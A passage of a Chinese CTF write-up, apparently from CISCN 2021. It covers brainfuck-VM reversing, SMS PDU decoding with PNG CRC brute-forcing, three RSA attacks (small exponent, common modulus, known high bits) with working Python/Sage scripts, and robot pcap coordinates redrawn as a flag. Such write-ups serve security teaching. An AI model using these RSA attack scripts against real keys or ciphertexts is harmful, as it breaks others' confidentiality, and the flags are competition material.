<span class="token variable">$__</span><span class="token operator">=</span><span class="token operator">-</span><span class="token operator">&gt;</span>_<span class="token punctuation">{</span>_<span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">||</span>_<span class="token operator">==</span><span class="token string-literal"><span class="token string">''</span></span><span class="token operator">?</span>$<span class="token punctuation">.</span><span class="token symbol">:$_</span><span class="token operator">+</span><span class="token variable">$__</span><span class="token punctuation">[</span>_<span class="token punctuation">[</span><span class="token variable">$_</span><span class="token operator">..</span>$<span class="token operator">-</span>_<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
<span class="token variable">@__</span><span class="token operator">=</span><span class="token operator">-</span><span class="token operator">&gt;</span>_<span class="token punctuation">,</span><span class="token operator">&amp;</span>__<span class="token punctuation">{</span>_<span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">?</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">:</span><span class="token punctuation">[</span>__<span class="token punctuation">[</span>_<span class="token punctuation">[</span>$<span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token variable">@__</span><span class="token punctuation">[</span>_<span class="token punctuation">[</span><span class="token variable">$_</span><span class="token operator">..</span>$<span class="token operator">-</span>_<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>__<span class="token punctuation">]</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>但是注意到后面有一串奇奇怪怪的数字，还有一个疑似switch遍历数字执行操作。嗯，好，是个VM。分析来分析去，顿悟，这8个opcode刚好对应brainfuck的八种操作。将opcode翻译成brainfuck，得到：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>&gt;&gt;[-]&gt;[-]&lt;&gt;++++++++[&lt;+++++++++&gt;-]&lt;+.&gt;++++++[&lt;++++++&gt;-]&lt;+.++.+++++.-.&gt;+++++++[&lt;--------&gt;-]&lt;--.[-]+&gt;&lt;&gt;[-]&lt;&lt;[-]&gt;[&gt;+&lt;&lt;+&gt;-]&gt;[&lt;+&gt;-]&lt;&gt;&lt;[-]&gt;&lt;,&gt;[-]&gt;[-]+++++++[&lt;+++++++++++&gt;-]&lt;&gt;&lt;&lt;&gt;[&lt;-&gt;-]&lt;[&gt;&gt;[-]&gt;&lt;&gt;[-]&lt;&lt;&lt;&lt;[-]&gt;&gt;&gt;[&gt;+&lt;&lt;&lt;&lt;+&gt;&gt;&gt;-]&gt;[&lt;+&gt;-]&lt;&gt;&lt;&lt;&lt;[-]][-]&gt;&lt;,&gt;[-]&gt;[-]++++++[&lt;+++++++++&gt;-]&lt;-&gt;&lt;&lt;&gt;[&lt;-&gt;-]&lt;[&gt;&gt;[-]&gt;&lt;&gt;[-]&lt;&lt;&lt;&lt;[-]&gt;&gt;&gt;[&gt;+&lt;&lt;&lt;&lt;+&gt;&gt;&gt;-]&gt;[&lt;+&gt;-]&lt;&gt;&lt;&lt;&lt;[-]][-]&gt;&lt;,&gt;[-]&gt;[-]++++++++[&lt;+++++++++++&gt;-]&lt;+&gt;&lt;&lt;&gt;[&lt;-&gt;-]&lt;[&gt;&gt;[-]&gt;&lt;&gt;[-]&lt;&lt;&lt;&lt;[-]&gt;&gt;&gt;[&gt;+&lt;&lt;&lt;&lt;+&gt;&gt;&gt;-]&gt;[&lt;+&gt;-]&lt;&gt;&lt;&lt;&lt;[-]][-]&gt;&lt;,&gt;[-]&gt;[-]++++++++[&lt;++++++++++++&gt;-]&lt;+&gt;&lt;&lt;&gt;[&lt;-&gt;-]&lt;[&gt;&gt;[-]&gt;&lt;&gt;[-]&lt;&lt;&lt;&lt;[-]&gt;&gt;&gt;[&gt;+&lt;&lt;&lt;&lt;+&gt;&gt;&gt;-]&gt;[&lt;+&gt;-]&lt;&gt;&lt;&lt;&lt;[-]][-]&gt;&lt;,&gt;[-]&gt;[-]+++++[&lt;+++++++++++&gt;-]&lt;&gt;&lt;&lt;&gt;[&lt;-&gt;-]&lt;[&gt;&gt;[-]&gt;&lt;&gt;[-]&lt;&lt;&lt;&lt;[-]&gt;&gt;&gt;[&gt;+&lt;&lt;&lt;&lt;+&gt;&gt;&gt;-]&gt;[&lt;+&gt;-]&lt;&gt;&lt;&lt;&lt;[-]][-]&gt;[-]&lt;&lt;[&gt;+&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;&gt;-]&lt;[&gt;&gt;[-]&gt;[-]&lt;&gt;++++++++[&lt;++++++++++&gt;-]&lt;-.----.&lt;&lt;[-]]&lt;&lt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>分析这东西更废脑子。索性找了个<a href="https://gist.github.com/Ricket/939687" target="_blank" rel="noopener noreferrer">Brainfuck到C的转译器<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>，<code>gcc -O3</code>编译之，拖进IDA。输入就出来了：</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>v7 <span class="token operator">=</span> <span class="token function">getc</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token char">'M'</span><span class="token punctuation">;</span>
<span class="token comment">// ...</span>
v8 <span class="token operator">=</span> <span class="token function">getc</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token char">'5'</span><span class="token punctuation">;</span>
<span class="token comment">// ...</span>
v9 <span class="token operator">=</span> <span class="token function">getc</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token char">'Y'</span><span class="token punctuation">;</span>
<span class="token comment">// ...</span>
v10 <span class="token operator">=</span> <span class="token function">getc</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token char">'a'</span><span class="token punctuation">;</span>
<span class="token comment">// ...</span>
v11 <span class="token operator">=</span> <span class="token function">getc</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token char">'7'</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>md5之得到flag。</p> <p><code>CISCN{bd5658f44db57f5a1580e5444e5849ce}</code></p> <h2 id="alice-bob"><a href="#alice-bob" class="header-anchor">#</a> alice_bob</h2> <p>继续一头雾水。拿第一行的前几个字节上网搜，发现了若干和GMS与短信有关的信息。继续找，确定数据是PDU编码，还找到了<a href="http://www.sendsms.cn/pdu/" target="_blank" rel="noopener noreferrer">解码网站<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>。魔改网页JS批量解码，前几条消息透露了flag的第一部分：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>SMSC#
Receipient:+8615030442000
Validity:Rel 4d 
TP_PID:00
TP_DCS:00
TP_DCS-popis:Uncompressed Text
No class
Alphabet:Default

hello,bob!what is the flag?
Length:27
---
SMSC#
Receipient:+10086
Validity:Not Present
TP_PID:00
TP_DCS:00
TP_DCS-popis:Uncompressed Text
No class
Alphabet:Default

the first part of the flag is the first 8 digits of your phone number
Length:69
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><p>后面则是大段的十六进制。提取出来，发现PNG文件头，但是数据全部错乱。突然发现十六进制的包都带有时间戳，遂按时间戳排序，得到图片。</p> <p><img src="2021-ciscn/2-3-1.png" alt=""></p> <p>显然图片长宽是错的，010 Editor也在抱怨IHDR CRC有误。找脚本爆破长宽，得到flag后半截。</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> zlib
<span class="token keyword">import</span> struct

filename <span class="token operator">=</span> <span class="token string">'save.png'</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    all_b <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    crc32key <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>all_b<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token number">33</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>all_b<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    n <span class="token operator">=</span> <span class="token number">4095</span>
    <span class="token keyword">for</span> w <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        width <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&gt;i'</span><span class="token punctuation">,</span> w<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> h <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
            height <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&gt;i'</span><span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                data<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> width<span class="token punctuation">[</span>x<span class="token punctuation">]</span>
                data<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> height<span class="token punctuation">[</span>x<span class="token punctuation">]</span>
            crc32result <span class="token operator">=</span> zlib<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
            <span class="token keyword">if</span> crc32result <span class="token operator">==</span> crc32key<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;width =&quot;</span><span class="token punctuation">,</span> width<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;height =&quot;</span><span class="token punctuation">,</span> height<span class="token punctuation">)</span>
                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p><img src="2021-ciscn/2-3-2.png" alt=""></p> <p>注意这个手写的UUID，分隔符用的是下划线。</p> <p><code>CISCN{15030442_b586_4c9e_b436_26def12293e4}</code></p> <h2 id="场景实操冲刺卷"><a href="#场景实操冲刺卷" class="header-anchor">#</a> 场景实操冲刺卷</h2> <h2 id="rsa"><a href="#rsa" class="header-anchor">#</a> RSA</h2> <p>flag分为三段，用了三种RSA攻击方式，分别为小公钥指数攻击，共模攻击，Factoring with high bits known攻击</p> <p>小公钥指数攻击：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python</span>
<span class="token comment">#coding:utf-8</span>
<span class="token comment">#小明文攻击   </span>
<span class="token comment">#适用情况:e较小,一般为3</span>
<span class="token comment">#公钥e很小，明文m也不大的话，于是m^e=k*n+m 中的的k值很小甚至为0，爆破k或直接开三次方即可。</span>
      
<span class="token keyword">import</span> gmpy2
<span class="token keyword">import</span> binascii
<span class="token keyword">import</span> libnum
<span class="token keyword">import</span> time
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes

n<span class="token operator">=</span><span class="token number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009</span>   
e<span class="token operator">=</span><span class="token number">3</span>    
res<span class="token operator">=</span><span class="token number">0</span>   <span class="token comment">#res是m  </span>
c<span class="token operator">=</span><span class="token number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span>
<span class="token comment"># c=int(open('flag.enc','rb').read().encode('hex'),16)    </span>
<span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200000000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    
    <span class="token keyword">if</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c<span class="token operator">+</span>n<span class="token operator">*</span>k<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>    
        res<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c<span class="token operator">+</span>n<span class="token operator">*</span>k<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    
        <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>res<span class="token punctuation">)</span>    
        <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>   
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><p>共模攻击：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python</span>
<span class="token comment">#coding:utf-8</span>

<span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes

e1 <span class="token operator">=</span> <span class="token number">17</span>
e2 <span class="token operator">=</span> <span class="token number">65537</span>
n <span class="token operator">=</span> <span class="token number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977</span>
c1<span class="token operator">=</span><span class="token number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span>
c2<span class="token operator">=</span><span class="token number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span>


_<span class="token punctuation">,</span> r<span class="token punctuation">,</span> s <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>

m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> r<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span> s<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">%</span> n
<span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>Factoring with high bits known:</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>p <span class="token operator">=</span> <span class="token number">7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902</span> <span class="token operator">&lt;&lt;</span><span class="token number">200</span>
n <span class="token operator">=</span> <span class="token number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span>

kbits <span class="token operator">=</span> <span class="token number">200</span>
PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">&gt;</span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
f <span class="token operator">=</span> x <span class="token operator">+</span> p
x0 <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> <span class="token string">&quot;x: %s&quot;</span> <span class="token operator">%</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>x0<span class="token punctuation">)</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> p<span class="token operator">+</span>x0
<span class="token keyword">print</span> <span class="token string">&quot;p: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">assert</span> n <span class="token operator">%</span> p <span class="token operator">==</span> <span class="token number">0</span>
q <span class="token operator">=</span> n<span class="token operator">/</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">&quot;q: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>exp.py</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token punctuation">,</span>bytes_to_long<span class="token punctuation">,</span>getPrime

msg1<span class="token operator">=</span>long_to_bytes<span class="token punctuation">(</span><span class="token number">267334379257781603687613466720913534310764480084016847281446486946801530200295563483353634338157</span><span class="token punctuation">)</span>

msg2<span class="token operator">=</span>long_to_bytes<span class="token punctuation">(</span><span class="token number">4193305853284549103821195807609492624095031428085219879448342104337322945001387680236011960472296815293233144303730273979905837762067652913308898433728800864776794638198055607422503065410595894676740531680367227696622352026247676452540064020322619036125381146346603655445487695574824919137</span><span class="token punctuation">)</span>

msg3<span class="token operator">=</span>long_to_bytes<span class="token punctuation">(</span><span class="token number">978430871477569051989776547659020359721056838635797362474311886436116962354292851181720060000979143571198378856012391742078510586927376783797757539078239088349758644144812898155106623543650953940606543822567423130350207207895380499638001151443841997176299548692737056724423631882</span><span class="token punctuation">)</span>
msg<span class="token operator">=</span>msg1<span class="token operator">+</span>msg2<span class="token operator">+</span>msg3

<span class="token keyword">print</span><span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>输出：3943e8843a19149497956901e5d98639</p> <p>flag为:CISCN{3943e8843a19149497956901e5d98639}</p> <h2 id="robot"><a href="#robot" class="header-anchor">#</a> robot</h2> <p><code>Robot.rspag</code>是Robot Studio的工程，但是这个软件太大了不想装。直接去看pcap，过滤主机发给机器人的数据（因为绘图坐标一定是主机发过去的），翻一翻，大喜：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>.......]p~...............D .SET./127.0.0.1/RAPID/T_ROB1/Module1/tgPos{57}.Value.[208,46,0]...
.......]p................D .SET./127.0.0.1/RAPID/T_ROB1/Module1/tgPos{58}.Value.[208,48,0]...
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>grep提之，规律跃然于屏幕上：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>$ strings cap.pcapng | grep -A 2 &quot;tgPos&quot;
0 -1 -SymTyp 112 -Source 255 -RegExp &quot;^tgPos$&quot; -URL RAPID/T_ROB1/Module1 -Output 15
15;     1;     1;1;#2;tgPos;RAPID/T_ROB1/Module1/tgPos;PER;1;1;0;0;RAPID/pos;pos;1;0;0;1;500;
/127.0.0.1/
Mode
--
/127.0.0.1/RAPID/T_ROB1/Module1/tgPos{1}
Value
[27,36,0]
--
/127.0.0.1/RAPID/T_ROB1/Module1/tgPos{2}
Value
[28,35,0]
--
/127.0.0.1/RAPID/T_ROB1/Module1/tgPos{3}
Value
[29,35,0]
--
...
--
/127.0.0.1/RAPID/T_ROB1/Module1/tgPos{109}
Value
[71,44,0]
--
/127.0.0.1/RAPID/T_ROB1/Module1/tgPos{110}
Value
[71,44,-10]
--
/127.0.0.1/RAPID/T_ROB1/Module1/tgPos{1}
Value
[125,23,0]
--
/127.0.0.1/RAPID/T_ROB1/Module1/tgPos{2}
Value
[125,23,0]
--
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br></div></div><p>python turtle画之，过一遍md5得到flag：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>

<span class="token keyword">import</span> turtle

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'tgPos.log'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
	points <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n--\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span> <span class="token punctuation">:</span> <span class="token punctuation">]</span>

segments <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> point <span class="token keyword">in</span> points<span class="token punctuation">:</span>
	s <span class="token operator">=</span> point<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
	segments<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'{'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span> <span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>segments<span class="token punctuation">)</span>

